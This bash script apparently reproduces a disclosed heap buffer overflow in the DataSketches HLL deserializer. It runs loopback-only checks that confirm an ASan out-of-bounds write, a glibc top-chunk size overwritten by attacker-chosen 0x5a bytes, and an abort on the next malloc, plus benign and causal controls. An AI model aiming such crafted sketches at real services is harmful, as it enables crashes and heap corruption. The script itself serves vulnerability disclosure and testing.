#!/usr/bin/env bash
# One-command replay of every loopback Datasketches2Shell check in this wake.
# All sockets are 127.0.0.1, bound by a child this script starts.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
bash "$HERE/build.sh" "$OUT" || exit 2
pass=0; fail=0
check() {
  if [ "$2" -eq 1 ]; then echo "PASS $1"; pass=$((pass + 1));
  else echo "FAIL $1"; fail=$((fail + 1)); fi
}
has() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }

# 1. Byte-buffer overload in the service process under ASan.
python3 "$HERE/drive.py" --bin "$OUT/service_asan" --port 38131 --count 64 \
  --value 90 --seed "$OUT/seed.bin" > "$OUT/byte_asan.log" 2>&1
a=$(cat "$OUT/byte_asan.log")
check "byte API: ASan WRITE of size 256 at pinned :116 via public deserialize" \
  "$([ "$(has 'heap-buffer-overflow' "$a" && has 'WRITE of size 256' "$a" && \
      has 'CouponList-internal.hpp:116' "$a" && has 'HllSketchImplFactory.hpp:101' "$a" && \
      has 'HllSketch-internal.hpp:63' "$a" && echo 1 || echo 0)" -eq 1 ] && echo 1 || echo 0)"

# 2. Stream overload in the service process under ASan.
python3 "$HERE/drive.py" --bin "$OUT/stream_service_asan" --port 38132 --count 64 \
  --value 90 --seed "$OUT/seed.bin" > "$OUT/stream_asan.log" 2>&1
s=$(cat "$OUT/stream_asan.log")
check "stream API: ASan WRITE of size 256 at pinned :162 via public deserialize" \
  "$([ "$(has 'heap-buffer-overflow' "$s" && has 'WRITE of size 256' "$s" && \
      has 'CouponList-internal.hpp:162' "$s" && has 'HllSketchImplFactory.hpp:86' "$s" && \
      has 'HllSketch-internal.hpp:57' "$s" && echo 1 || echo 0)" -eq 1 ] && echo 1 || echo 0)"

# 3. Real glibc metadata before/after the library copy, under gdb.
python3 "$HERE/drive.py" --bin "$OUT/service_plain" --port 38133 --count 64 \
  --value 90 --seed "$OUT/seed.bin" --gdb-script "$HERE/gdb_heap.gdb" \
  > "$OUT/gdb_heap.log" 2>&1
g=$(cat "$OUT/gdb_heap.log")
check "gdb: chosen 0x5a overwrites real next-chunk size at coupon+40" \
  "$([ "$(has 'GDB_HIT copy_site' "$g" && has 'GDB_COUPON_DATA=' "$g" && \
      has 'GDB_BEFORE chunk' "$g" && has '0x000000000000dbd1' "$g" && \
      has 'GDB_AFTER chunk' "$g" && has '0x5a5a5a5a5a5a5a5a' "$g" && echo 1 || echo 0)" -eq 1 ] && echo 1 || echo 0)"

# 4. Consequence: next legitimate malloc aborts; benign control stays clean.
python3 "$HERE/drive.py" --bin "$OUT/service_plain" --port 38134 --count 64 \
  --value 90 --seed "$OUT/seed.bin" --extra postalloc > "$OUT/postalloc_64.log" 2>&1
h=$(cat "$OUT/postalloc_64.log")
python3 "$HERE/drive.py" --bin "$OUT/service_plain" --port 38135 --count 2 \
  --value 90 --seed "$OUT/seed.bin" --extra postalloc > "$OUT/postalloc_2.log" 2>&1
b=$(cat "$OUT/postalloc_2.log")
check "hostile: malloc after deserialize aborts with corrupted top size" \
  "$([ "$(has 'malloc(): corrupted top size' "$h" && has 'service_rc=-6' "$h" && echo 1 || echo 0)" -eq 1 ] && echo 1 || echo 0)"
check "benign count 2: post-allocation and exit clean" \
  "$([ "$(has 'SERVICE_POSTALLOC ok byte=11' "$b" && has 'service_rc=0' "$b" && echo 1 || echo 0)" -eq 1 ] && echo 1 || echo 0)"

# 5. Causal control: keep the 256-byte overflow but restore the original top
# size word at coupon+40 (0xdbd1, little endian); the abort must disappear.
python3 "$HERE/drive.py" --bin "$OUT/service_plain" --port 38136 --count 64 \
  --value 90 --seed "$OUT/seed.bin" --extra postalloc \
  --patch 40=d1,41=db,42=00,43=00,44=00,45=00,46=00,47=00 \
  > "$OUT/postalloc_restored.log" 2>&1
r=$(cat "$OUT/postalloc_restored.log")
check "causal control: restored top size word removes the abort" \
  "$([ "$(has 'SERVICE_POSTALLOC ok byte=11' "$r" && has 'service_rc=0' "$r" && echo 1 || echo 0)" -eq 1 ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL_CHECKS_PASS"; exit 0; }
echo "SOME_CHECKS_FAILED"; exit 1
